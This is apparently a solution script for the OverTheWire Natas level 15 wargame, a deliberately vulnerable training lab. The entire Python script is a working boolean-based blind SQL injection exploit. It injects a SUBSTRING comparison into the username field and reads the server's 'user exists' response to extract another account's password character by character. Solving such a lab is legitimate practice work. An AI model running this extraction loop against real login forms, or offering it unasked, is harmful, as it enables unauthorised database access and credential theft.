import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
charset = string.ascii_letters + string.digits
this_password = '[NATAS15 PASSWORD]'

session = requests.Session()
session.auth = ('natas15', this_password)

password = ""

for i in range(1, 33):
    for guess in charset:
        payload = {
            "username": f'natas16" AND BINARY SUBSTRING(password, {i}, 1) = "{guess}'
        }
        response = session.post(url, data = payload)
        if 'This user exists.' in response.text:
            print(f'{guess} in position {i}')
            password = password + guess
            break

print(password)


